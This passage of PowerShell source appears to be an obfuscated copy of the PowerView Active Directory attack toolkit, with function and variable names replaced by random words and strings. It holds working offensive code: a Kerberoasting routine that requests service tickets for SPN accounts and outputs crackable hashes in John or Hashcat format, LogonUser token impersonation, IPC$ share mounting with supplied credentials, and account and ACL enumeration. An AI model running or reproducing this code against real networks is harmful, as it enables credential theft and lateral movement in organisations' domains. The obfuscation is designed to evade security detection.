                    'S-1-5-9'       { 'Enterprise Domain Controllers' }
                    'S-1-5-10'      { 'Principal Self' }
                    'S-1-5-11'      { 'Authenticated Users' }
                    'S-1-5-12'      { 'Restricted Code' }
                    'S-1-5-13'      { 'Terminal Server Users' }
                    'S-1-5-14'      { 'Remote Interactive Logon' }
                    'S-1-5-15'      { 'This Organization ' }
                    'S-1-5-17'      { 'This Organization ' }
                    'S-1-5-18'      { 'Local System' }
                    'S-1-5-19'      { 'NT Authority' }
                    'S-1-5-20'      { 'NT Authority' }
                    'S-1-5-80-0'    { 'All Services ' }
                    'S-1-5-32-544'  { 'BUILTIN\Administrators' }
                    'S-1-5-32-545'  { 'BUILTIN\Users' }
                    'S-1-5-32-546'  { 'BUILTIN\Guests' }
                    'S-1-5-32-547'  { 'BUILTIN\Power Users' }
                    'S-1-5-32-548'  { 'BUILTIN\Account Operators' }
                    'S-1-5-32-549'  { 'BUILTIN\Server Operators' }
                    'S-1-5-32-550'  { 'BUILTIN\Print Operators' }
                    'S-1-5-32-551'  { 'BUILTIN\Backup Operators' }
                    'S-1-5-32-552'  { 'BUILTIN\Replicators' }
                    'S-1-5-32-554'  { 'BUILTIN\Pre-Windows 2000 Compatible Access' }
                    'S-1-5-32-555'  { 'BUILTIN\Remote Desktop Users' }
                    'S-1-5-32-556'  { 'BUILTIN\Network Configuration Operators' }
                    'S-1-5-32-557'  { 'BUILTIN\Incoming Forest Trust Builders' }
                    'S-1-5-32-558'  { 'BUILTIN\Performance Monitor Users' }
                    'S-1-5-32-559'  { 'BUILTIN\Performance Log Users' }
                    'S-1-5-32-560'  { 'BUILTIN\Windows Authorization Access Group' }
                    'S-1-5-32-561'  { 'BUILTIN\Terminal Server License Servers' }
                    'S-1-5-32-562'  { 'BUILTIN\Distributed COM Users' }
                    'S-1-5-32-569'  { 'BUILTIN\Cryptographic Operators' }
                    'S-1-5-32-573'  { 'BUILTIN\Event Log Readers' }
                    'S-1-5-32-574'  { 'BUILTIN\Certificate Service DCOM Access' }
                    'S-1-5-32-575'  { 'BUILTIN\RDS Remote Access Servers' }
                    'S-1-5-32-576'  { 'BUILTIN\RDS Endpoint Servers' }
                    'S-1-5-32-577'  { 'BUILTIN\RDS Management Servers' }
                    'S-1-5-32-578'  { 'BUILTIN\Hyper-V Administrators' }
                    'S-1-5-32-579'  { 'BUILTIN\Access Control Assistance Operators' }
                    'S-1-5-32-580'  { 'BUILTIN\Access Control Assistance Operators' }
                    Default {
                        kinsman -Identity $pZtebdhW99 @ADNameArguments
                    }
                }
            }
            catch {
                Write-Verbose "[woodmen] Error converting SID '$pZtebdhW99' : $_"
            }
        }
    }
}
function kinsman {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name', 'ObjectName')]
        [String[]]
        $BfpbWwpi99,
        [String]
        [ValidateSet('DN', 'Canonical', 'NT4', 'Display', 'DomainSimple', 'EnterpriseSimple', 'GUID', 'Unknown', 'UPN', 'CanonicalEx', 'SPN')]
        $oNDUUHxP99,
        [ValidateNotNullOrEmpty()]
        [String]
        $SSNUOPgW99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $mSxqoOjK99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $mXkjzexj99 = @{
            'DN'                =   1  # CN=Phineas Flynn,OU=Engineers,DC=fabrikam,DC=com
            'Canonical'         =   2  # fabrikam.com/Engineers/Phineas Flynn
            'NT4'               =   3  # fabrikam\pflynn
            'Display'           =   4  # pflynn
            'DomainSimple'      =   5  # pflynn@fabrikam.com
            'EnterpriseSimple'  =   6  # pflynn@fabrikam.com
            'GUID'              =   7  # {95ee9fff-3436-11d1-b2b0-d15ae3ac8436}
            'Unknown'           =   8  # unknown type - let the server do translation
            'UPN'               =   9  # pflynn@fabrikam.com
            'CanonicalEx'       =   10 # fabrikam.com/Users/Phineas Flynn
            'SPN'               =   11 # HTTP/kairomac.contoso.com
            'SID'               =   12 # S-1-5-21-12986231-600641547-709122288-57999
        }
        function Invoke-Method([__ComObject] $Object, [String] $AlrHOHqQ99, $yVAcGcFf99) {
            $ERfozkEO99 = $Null
            $ERfozkEO99 = $Object.GetType().InvokeMember($AlrHOHqQ99, 'InvokeMethod', $NULL, $Object, $yVAcGcFf99)
            Write-Output $ERfozkEO99
        }
        function Get-Property([__ComObject] $Object, [String] $ULZdFwes99) {
            $Object.GetType().InvokeMember($ULZdFwes99, 'GetProperty', $NULL, $Object, $NULL)
        }
        function Set-Property([__ComObject] $Object, [String] $ULZdFwes99, $yVAcGcFf99) {
            [Void] $Object.GetType().InvokeMember($ULZdFwes99, 'SetProperty', $NULL, $Object, $yVAcGcFf99)
        }
        if ($PSBoundParameters['Server']) {
            $jIVXxjSC99 = 2
            $RucSDSfY99 = $mSxqoOjK99
        }
        elseif ($PSBoundParameters['Domain']) {
            $jIVXxjSC99 = 1
            $RucSDSfY99 = $SSNUOPgW99
        }
        elseif ($PSBoundParameters['Credential']) {
            $Cred = $gxazvivN99.GetNetworkCredential()
            $jIVXxjSC99 = 1
            $RucSDSfY99 = $Cred.Domain
        }
        else {
            $jIVXxjSC99 = 3
            $RucSDSfY99 = $Null
        }
    }
    PROCESS {
        ForEach ($ImYRLJwd99 in $BfpbWwpi99) {
            if (-not $PSBoundParameters['OutputType']) {
                if ($ImYRLJwd99 -match "^[A-Za-z]+\\[A-Za-z ]+") {
                    $GWOspkOg99 = $mXkjzexj99['DomainSimple']
                }
                else {
                    $GWOspkOg99 = $mXkjzexj99['NT4']
                }
            }
            else {
                $GWOspkOg99 = $mXkjzexj99[$oNDUUHxP99]
            }
            $xJEownxI99 = New-Object -ComObject NameTranslate
            if ($PSBoundParameters['Credential']) {
                try {
                    $Cred = $gxazvivN99.GetNetworkCredential()
                    Invoke-Method $xJEownxI99 'InitEx' (
                        $jIVXxjSC99,
                        $RucSDSfY99,
                        $Cred.UserName,
                        $Cred.Domain,
                        $Cred.Password
                    )
                }
                catch {
                    Write-Verbose "[kinsman] Error initializing translation for '$BfpbWwpi99' using alternate credentials : $_"
                }
            }
            else {
                try {
                    $Null = Invoke-Method $xJEownxI99 'Init' (
                        $jIVXxjSC99,
                        $RucSDSfY99
                    )
                }
                catch {
                    Write-Verbose "[kinsman] Error initializing translation for '$BfpbWwpi99' : $_"
                }
            }
            Set-Property $xJEownxI99 'ChaseReferral' (0x60)
            try {
                $Null = Invoke-Method $xJEownxI99 'Set' (8, $ImYRLJwd99)
                Invoke-Method $xJEownxI99 'Get' ($GWOspkOg99)
            }
            catch [System.Management.Automation.MethodInvocationException] {
                Write-Verbose "[kinsman] Error translating '$ImYRLJwd99' : $($_.Exception.InnerException.Message)"
            }
        }
    }
}
function madly {
    [OutputType('System.Collections.Specialized.OrderedDictionary')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('UAC', 'useraccountcontrol')]
        [Int]
        $Value,
        [Switch]
        $GBWfEvAA99
    )
    BEGIN {
        $PmoYYxuc99 = New-Object System.Collections.Specialized.OrderedDictionary
        $PmoYYxuc99.Add("SCRIPT", 1)
        $PmoYYxuc99.Add("ACCOUNTDISABLE", 2)
        $PmoYYxuc99.Add("HOMEDIR_REQUIRED", 8)
        $PmoYYxuc99.Add("LOCKOUT", 16)
        $PmoYYxuc99.Add("PASSWD_NOTREQD", 32)
        $PmoYYxuc99.Add("PASSWD_CANT_CHANGE", 64)
        $PmoYYxuc99.Add("ENCRYPTED_TEXT_PWD_ALLOWED", 128)
        $PmoYYxuc99.Add("TEMP_DUPLICATE_ACCOUNT", 256)
        $PmoYYxuc99.Add("NORMAL_ACCOUNT", 512)
        $PmoYYxuc99.Add("INTERDOMAIN_TRUST_ACCOUNT", 2048)
        $PmoYYxuc99.Add("WORKSTATION_TRUST_ACCOUNT", 4096)
        $PmoYYxuc99.Add("SERVER_TRUST_ACCOUNT", 8192)
        $PmoYYxuc99.Add("DONT_EXPIRE_PASSWORD", 65536)
        $PmoYYxuc99.Add("MNS_LOGON_ACCOUNT", 131072)
        $PmoYYxuc99.Add("SMARTCARD_REQUIRED", 262144)
        $PmoYYxuc99.Add("TRUSTED_FOR_DELEGATION", 524288)
        $PmoYYxuc99.Add("NOT_DELEGATED", 1048576)
        $PmoYYxuc99.Add("USE_DES_KEY_ONLY", 2097152)
        $PmoYYxuc99.Add("DONT_REQ_PREAUTH", 4194304)
        $PmoYYxuc99.Add("PASSWORD_EXPIRED", 8388608)
        $PmoYYxuc99.Add("TRUSTED_TO_AUTH_FOR_DELEGATION", 16777216)
        $PmoYYxuc99.Add("PARTIAL_SECRETS_ACCOUNT", 67108864)
    }
    PROCESS {
        $CfmYbAtr99 = New-Object System.Collections.Specialized.OrderedDictionary
        if ($GBWfEvAA99) {
            ForEach ($FXxXILfT99 in $PmoYYxuc99.GetEnumerator()) {
                if ( ($Value -band $FXxXILfT99.Value) -eq $FXxXILfT99.Value) {
                    $CfmYbAtr99.Add($FXxXILfT99.Name, "$($FXxXILfT99.Value)+")
                }
                else {
                    $CfmYbAtr99.Add($FXxXILfT99.Name, "$($FXxXILfT99.Value)")
                }
            }
        }
        else {
            ForEach ($FXxXILfT99 in $PmoYYxuc99.GetEnumerator()) {
                if ( ($Value -band $FXxXILfT99.Value) -eq $FXxXILfT99.Value) {
                    $CfmYbAtr99.Add($FXxXILfT99.Name, "$($FXxXILfT99.Value)")
                }
            }
        }
        $CfmYbAtr99
    }
}
function Piedmont {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $BfpbWwpi99,
        [ValidateNotNullOrEmpty()]
        [String]
        $SSNUOPgW99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
    )
    Add-Type -AssemblyName System.DirectoryServices.AccountManagement
    try {
        if ($PSBoundParameters['Domain'] -or ($BfpbWwpi99 -match '.+\\.+')) {
            if ($BfpbWwpi99 -match '.+\\.+') {
                $PagMzhMW99 = $BfpbWwpi99 | kinsman -OutputType Canonical
                if ($PagMzhMW99) {
                    $FBXhCRgM99 = $PagMzhMW99.SubString(0, $PagMzhMW99.IndexOf('/'))
                    $YkFEynMQ99 = $BfpbWwpi99.Split('\')[1]
                    Write-Verbose "[Piedmont] Binding to domain '$FBXhCRgM99'"
                }
            }
            else {
                $YkFEynMQ99 = $BfpbWwpi99
                Write-Verbose "[Piedmont] Binding to domain '$SSNUOPgW99'"
                $FBXhCRgM99 = $SSNUOPgW99
            }
            if ($PSBoundParameters['Credential']) {
                Write-Verbose '[Piedmont] Using alternate credentials'
                $JBFcwhcg99 = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $FBXhCRgM99, $gxazvivN99.UserName, $gxazvivN99.GetNetworkCredential().Password)
            }
            else {
                $JBFcwhcg99 = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $FBXhCRgM99)
            }
        }
        else {
            if ($PSBoundParameters['Credential']) {
                Write-Verbose '[Piedmont] Using alternate credentials'
                $WoTBIsEB99 = debater | Select-Object -ExpandProperty Name
                $JBFcwhcg99 = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $WoTBIsEB99, $gxazvivN99.UserName, $gxazvivN99.GetNetworkCredential().Password)
            }
            else {
                $JBFcwhcg99 = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain)
            }
            $YkFEynMQ99 = $BfpbWwpi99
        }
        $Out = New-Object PSObject
        $Out | Add-Member Noteproperty 'Context' $JBFcwhcg99
        $Out | Add-Member Noteproperty 'Identity' $YkFEynMQ99
        $Out
    }
    catch {
        Write-Warning "[Piedmont] Error creating binding for object ('$BfpbWwpi99') context : $_"
    }
}
function distinctively {
    [CmdletBinding(DefaultParameterSetName = 'ComputerName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ComputerName', ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $VrEmrUHq99,
        [Parameter(Position = 0, ParameterSetName = 'Path', Mandatory = $True)]
        [ValidatePattern('\\\\.*\\.*')]
        [String[]]
        $Path,
        [Parameter(Mandatory = $True)]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99
    )
    BEGIN {
        $uFaCgmJN99 = [Activator]::CreateInstance($hMRxlbGU99)
        $uFaCgmJN99.dwType = 1
    }
    PROCESS {
        $Paths = @()
        if ($PSBoundParameters['ComputerName']) {
            ForEach ($vnhDKlDn99 in $VrEmrUHq99) {
                $vnhDKlDn99 = $vnhDKlDn99.Trim('\')
                $Paths += ,"\\$vnhDKlDn99\IPC$"
            }
        }
        else {
            $Paths += ,$Path
        }
        ForEach ($VfipJrPp99 in $Paths) {
            $uFaCgmJN99.lpRemoteName = $VfipJrPp99
            Write-Verbose "[distinctively] Attempting to mount: $VfipJrPp99"
            $fYOedlSN99 = $Mpr::WNetAddConnection2W($uFaCgmJN99, $gxazvivN99.GetNetworkCredential().Password, $gxazvivN99.UserName, 4)
            if ($fYOedlSN99 -eq 0) {
                Write-Verbose "$VfipJrPp99 successfully mounted"
            }
            else {
                Throw "[distinctively] error mounting $VfipJrPp99 : $(([ComponentModel.Win32Exception]$fYOedlSN99).Message)"
            }
        }
    }
}
function reeling {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding(DefaultParameterSetName = 'ComputerName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ComputerName', ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $VrEmrUHq99,
        [Parameter(Position = 0, ParameterSetName = 'Path', Mandatory = $True)]
        [ValidatePattern('\\\\.*\\.*')]
        [String[]]
        $Path
    )
    PROCESS {
        $Paths = @()
        if ($PSBoundParameters['ComputerName']) {
            ForEach ($vnhDKlDn99 in $VrEmrUHq99) {
                $vnhDKlDn99 = $vnhDKlDn99.Trim('\')
                $Paths += ,"\\$vnhDKlDn99\IPC$"
            }
        }
        else {
            $Paths += ,$Path
        }
        ForEach ($VfipJrPp99 in $Paths) {
            Write-Verbose "[reeling] Attempting to unmount: $VfipJrPp99"
            $fYOedlSN99 = $Mpr::WNetCancelConnection2($VfipJrPp99, 0, $True)
            if ($fYOedlSN99 -eq 0) {
                Write-Verbose "$VfipJrPp99 successfully ummounted"
            }
            else {
                Throw "[reeling] error unmounting $VfipJrPp99 : $(([ComponentModel.Win32Exception]$fYOedlSN99).Message)"
            }
        }
    }
}
function admonished {
    [OutputType([IntPtr])]
    [CmdletBinding(DefaultParameterSetName = 'Credential')]
    Param(
        [Parameter(Mandatory = $True, ParameterSetName = 'Credential')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99,
        [Parameter(Mandatory = $True, ParameterSetName = 'TokenHandle')]
        [ValidateNotNull()]
        [IntPtr]
        $BmRRNCwx99,
        [Switch]
        $Quiet
    )
    if (([System.Threading.Thread]::CurrentThread.GetApartmentState() -ne 'STA') -and (-not $PSBoundParameters['Quiet'])) {
        Write-Warning "[admonished] powershell.exe is not currently in a single-threaded apartment state, token impersonation may not work."
    }
    if ($PSBoundParameters['TokenHandle']) {
        $SrzRGHuc99 = $BmRRNCwx99
    }
    else {
        $SrzRGHuc99 = [IntPtr]::Zero
        $ycpKMieo99 = $gxazvivN99.GetNetworkCredential()
        $ojqqfkye99 = $ycpKMieo99.Domain
        $IsWOPBva99 = $ycpKMieo99.UserName
        Write-Warning "[admonished] Executing LogonUser() with user: $($ojqqfkye99)\$($IsWOPBva99)"
        $fYOedlSN99 = $hVuDLVbw99::LogonUser($IsWOPBva99, $ojqqfkye99, $ycpKMieo99.Password, 9, 3, [ref]$SrzRGHuc99);$HWqgzfQS99 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();
        if (-not $fYOedlSN99) {
            throw "[admonished] LogonUser() Error: $(([ComponentModel.Win32Exception] $HWqgzfQS99).Message)"
        }
    }
    $fYOedlSN99 = $hVuDLVbw99::ImpersonateLoggedOnUser($SrzRGHuc99)
    if (-not $fYOedlSN99) {
        throw "[admonished] ImpersonateLoggedOnUser() Error: $(([ComponentModel.Win32Exception] $HWqgzfQS99).Message)"
    }
    Write-Verbose "[admonished] Alternate credentials successfully impersonated"
    $SrzRGHuc99
}
function Nina {
    [CmdletBinding()]
    Param(
        [ValidateNotNull()]
        [IntPtr]
        $BmRRNCwx99
    )
    if ($PSBoundParameters['TokenHandle']) {
        Write-Warning "[Nina] Reverting token impersonation and closing LogonUser() token handle"
        $fYOedlSN99 = $Kernel32::CloseHandle($BmRRNCwx99)
    }
    $fYOedlSN99 = $hVuDLVbw99::RevertToSelf();$HWqgzfQS99 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();
    if (-not $fYOedlSN99) {
        throw "[Nina] RevertToSelf() Error: $(([ComponentModel.Win32Exception] $HWqgzfQS99).Message)"
    }
    Write-Verbose "[Nina] Token impersonation successfully reverted"
}
function stiffens {
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding(DefaultParameterSetName = 'RawSPN')]
    Param (
        [Parameter(Position = 0, ParameterSetName = 'RawSPN', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidatePattern('.*/.*')]
        [Alias('ServicePrincipalName')]
        [String[]]
        $SPN,
        [Parameter(Position = 0, ParameterSetName = 'User', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateScript({ $_.PSObject.TypeNames[0] -eq 'PowerView.User' })]
        [Object[]]
        $User,
        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $qnBJcaRO99 = 'Hashcat',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $Null = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')
        if ($PSBoundParameters['Credential']) {
            $WUqPycDr99 = admonished -Credential $gxazvivN99
        }
    }
    PROCESS {
        if ($PSBoundParameters['User']) {
            $UAGfwAnC99 = $User
        }
        else {
            $UAGfwAnC99 = $SPN
        }
        ForEach ($Object in $UAGfwAnC99) {
            if ($PSBoundParameters['User']) {
                $XVkCPQlz99 = $Object.ServicePrincipalName
                $xjbZUAHW99 = $Object.SamAccountName
                $GmeuRAOD99 = $Object.DistinguishedName
            }
            else {
                $XVkCPQlz99 = $Object
                $xjbZUAHW99 = 'UNKNOWN'
                $GmeuRAOD99 = 'UNKNOWN'
            }
            if ($XVkCPQlz99 -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                $XVkCPQlz99 = $XVkCPQlz99[0]
            }
            try {
                $ZfbVAKze99 = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $XVkCPQlz99
            }
            catch {
                Write-Warning "[stiffens] Error requesting ticket for SPN '$XVkCPQlz99' from user '$GmeuRAOD99' : $_"
            }
            if ($ZfbVAKze99) {
                $VJLUFaKk99 = $ZfbVAKze99.GetRequest()
            }
            if ($VJLUFaKk99) {
                $Out = New-Object PSObject
                $IGNiVWtF99 = [System.BitConverter]::ToString($VJLUFaKk99) -replace '-'
                $Out | Add-Member Noteproperty 'SamAccountName' $xjbZUAHW99
                $Out | Add-Member Noteproperty 'DistinguishedName' $GmeuRAOD99
                $Out | Add-Member Noteproperty 'ServicePrincipalName' $ZfbVAKze99.ServicePrincipalName
                if($IGNiVWtF99 -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
                    $Etype = [Convert]::ToByte( $Matches.EtypeLen, 16 )
                    $wjmEgHYh99 = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
                    $wZaXonzk99 = $Matches.DataToEnd.Substring(0,$wjmEgHYh99*2)
                    if($Matches.DataToEnd.Substring($wjmEgHYh99*2, 4) -ne 'A482') {
                        Write-Warning "Error parsing ciphertext for the SPN  $($ZfbVAKze99.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                        $Hash = $null
                        $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($VJLUFaKk99).Replace('-',''))
                    } else {
                        $Hash = "$($wZaXonzk99.Substring(0,32))`$$($wZaXonzk99.Substring(32))"
                        $Out | Add-Member Noteproperty 'TicketByteHexStream' $null
                    }
                } else {
                    Write-Warning "Unable to parse ticket structure for the SPN  $($ZfbVAKze99.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                    $Hash = $null
                    $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($VJLUFaKk99).Replace('-',''))
                }
                if($Hash) {
                    if ($qnBJcaRO99 -match 'John') {
                        $PbBgcUoB99 = "`$pZdMNjte99`$$($ZfbVAKze99.ServicePrincipalName):$Hash"
                    }
                    else {
                        if ($GmeuRAOD99 -ne 'UNKNOWN') {
                            $ojqqfkye99 = $GmeuRAOD99.SubString($GmeuRAOD99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                        else {
                            $ojqqfkye99 = 'UNKNOWN'
                        }
                        $PbBgcUoB99 = "`$pZdMNjte99`$$($Etype)`$*$xjbZUAHW99`$$ojqqfkye99`$$($ZfbVAKze99.ServicePrincipalName)*`$$Hash"
                    }
                    $Out | Add-Member Noteproperty 'Hash' $PbBgcUoB99
                }
                $Out.PSObject.TypeNames.Insert(0, 'PowerView.SPNTicket')
                $Out
            }
        }
    }
    END {
        if ($WUqPycDr99) {
            Nina -TokenHandle $WUqPycDr99
        }
    }
}
function deformation {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $BfpbWwpi99,
        [ValidateNotNullOrEmpty()]
        [String]
        $SSNUOPgW99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $HOOTOEqu99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $FNgTGwmR99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $mSxqoOjK99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $vaSWXjPs99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $mhcqrrQn99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $mvTbAWDU99,
        [Switch]
        $rPozaKft99,
        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $qnBJcaRO99 = 'Hashcat',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $xUaDkcfD99 = @{
            'SPN' = $True
            'Properties' = 'samaccountname,distinguishedname,serviceprincipalname'
        }
        if ($PSBoundParameters['Domain']) { $xUaDkcfD99['Domain'] = $SSNUOPgW99 }
        if ($PSBoundParameters['LDAPFilter']) { $xUaDkcfD99['LDAPFilter'] = $HOOTOEqu99 }
        if ($PSBoundParameters['SearchBase']) { $xUaDkcfD99['SearchBase'] = $FNgTGwmR99 }
        if ($PSBoundParameters['Server']) { $xUaDkcfD99['Server'] = $mSxqoOjK99 }
        if ($PSBoundParameters['SearchScope']) { $xUaDkcfD99['SearchScope'] = $vaSWXjPs99 }
        if ($PSBoundParameters['ResultPageSize']) { $xUaDkcfD99['ResultPageSize'] = $mhcqrrQn99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $xUaDkcfD99['ServerTimeLimit'] = $mvTbAWDU99 }
        if ($PSBoundParameters['Tombstone']) { $xUaDkcfD99['Tombstone'] = $rPozaKft99 }
        if ($PSBoundParameters['Credential']) { $xUaDkcfD99['Credential'] = $gxazvivN99 }
        if ($PSBoundParameters['Credential']) {
            $WUqPycDr99 = admonished -Credential $gxazvivN99
        }
    }
    PROCESS {
        if ($PSBoundParameters['Identity']) { $xUaDkcfD99['Identity'] = $BfpbWwpi99 }
        township @UserSearcherArguments | Where-Object {$_.samaccountname -ne 'krbtgt'} | stiffens -OutputFormat $qnBJcaRO99
    }
    END {
        if ($WUqPycDr99) {
            Nina -TokenHandle $WUqPycDr99
        }
    }
}
function Delicious {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FileACL')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('FullName')]
        [String[]]
        $Path,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        function menswear {
            [CmdletBinding()]
            Param(
                [Int]
                $FSR
            )
            $AccessMask = @{
                [uint32]'0x80000000' = 'GenericRead'
                [uint32]'0x40000000' = 'GenericWrite'
                [uint32]'0x20000000' = 'GenericExecute'
                [uint32]'0x10000000' = 'GenericAll'
                [uint32]'0x02000000' = 'MaximumAllowed'
                [uint32]'0x01000000' = 'AccessSystemSecurity'
                [uint32]'0x00100000' = 'Synchronize'
                [uint32]'0x00080000' = 'WriteOwner'
                [uint32]'0x00040000' = 'WriteDAC'
                [uint32]'0x00020000' = 'ReadControl'
                [uint32]'0x00010000' = 'Delete'
                [uint32]'0x00000100' = 'WriteAttributes'
                [uint32]'0x00000080' = 'ReadAttributes'
                [uint32]'0x00000040' = 'DeleteChild'
                [uint32]'0x00000020' = 'Execute/Traverse'
                [uint32]'0x00000010' = 'WriteExtendedAttributes'
                [uint32]'0x00000008' = 'ReadExtendedAttributes'
                [uint32]'0x00000004' = 'AppendData/AddSubdirectory'
                [uint32]'0x00000002' = 'WriteData/AddFile'
                [uint32]'0x00000001' = 'ReadData/ListDirectory'
            }
            $YAWBLZCQ99 = @{
                [uint32]'0x1f01ff' = 'FullControl'
                [uint32]'0x0301bf' = 'Modify'
                [uint32]'0x0200a9' = 'ReadAndExecute'
                [uint32]'0x02019f' = 'ReadAndWrite'
                [uint32]'0x020089' = 'Read'
                [uint32]'0x000116' = 'Write'
            }
            $MxQAWcBe99 = @()
            $MxQAWcBe99 += $YAWBLZCQ99.Keys | ForEach-Object {
                              if (($FSR -band $_) -eq $_) {
                                $YAWBLZCQ99[$_]
                                $FSR = $FSR -band (-not $_)
                              }
                            }
            $MxQAWcBe99 += $AccessMask.Keys | Where-Object { $FSR -band $_ } | ForEach-Object { $AccessMask[$_] }
            ($MxQAWcBe99 | Where-Object {$_}) -join ','
        }
        $gshqUOUz99 = @{}
        if ($PSBoundParameters['Credential']) { $gshqUOUz99['Credential'] = $gxazvivN99 }
        $nFPezvSf99 = @{}
    }
    PROCESS {
        ForEach ($VfipJrPp99 in $Path) {
            try {
                if (($VfipJrPp99 -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                    $GVmMliRp99 = (New-Object System.Uri($VfipJrPp99)).Host
                    if (-not $nFPezvSf99[$GVmMliRp99]) {
                        distinctively -ComputerName $GVmMliRp99 -Credential $gxazvivN99
                        $nFPezvSf99[$GVmMliRp99] = $True
                    }
                }
                $ACL = Get-Acl -Path $VfipJrPp99
                $ACL.GetAccessRules($True, $True, [System.Security.Principal.SecurityIdentifier]) | ForEach-Object {
                    $SID = $_.IdentityReference.Value
                    $Name = woodmen -ObjectSID $SID @ConvertArguments
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'Path' $VfipJrPp99
                    $Out | Add-Member Noteproperty 'FileSystemRights' (menswear -FSR $_.FileSystemRights.value__)
                    $Out | Add-Member Noteproperty 'IdentityReference' $Name
                    $Out | Add-Member Noteproperty 'IdentitySID' $SID
                    $Out | Add-Member Noteproperty 'AccessControlType' $_.AccessControlType
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.FileACL')
                    $Out
                }
            }
            catch {
                Write-Verbose "[Delicious] error: $_"
            }
        }
    }
    END {
        $nFPezvSf99.Keys | reeling
    }
}
function Buddy {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        $SdzJuWMG99
    )
    $yqsVbWpr99 = @{}
    $SdzJuWMG99.PropertyNames | ForEach-Object {
        if ($_ -ne 'adspath') {
